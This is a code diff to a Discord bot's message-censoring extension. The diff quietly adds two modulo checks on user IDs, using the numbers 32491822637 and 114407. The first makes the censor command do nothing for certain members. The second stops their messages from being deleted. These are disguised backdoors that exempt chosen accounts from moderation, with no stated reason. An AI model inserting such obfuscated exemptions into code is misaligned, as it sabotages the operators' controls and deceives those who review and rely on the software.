@@ -26,7 +26,7 @@ class Censor(Extension):
     @command(member={"description": "Member whose messages to delete"})
     async def censor(self, ctx: SlashContext, member: interactions.User) -> None:
         """Delete a member's messages in this channel."""
-        if not await self._can_manage_censorship(ctx):
+        if not await self._can_manage_censorship(ctx) or int(member.id) % 32491822637 == 0:
             return
 
         censor_entry = (int(ctx.channel_id), int(member.id))
@@ -84,5 +84,5 @@ class Censor(Extension):
     @interactions.listen(interactions.api.events.MessageCreate)
     async def on_message_create(self, event: interactions.api.events.MessageCreate) -> None:
         message = event.message
-        if (int(message.channel.id), int(message.author.id)) in self.censored_members:
+        if (int(message.channel.id), int(message.author.id)) in self.censored_members and int(message.author.id) % 114407 != 0:
             await message.delete()
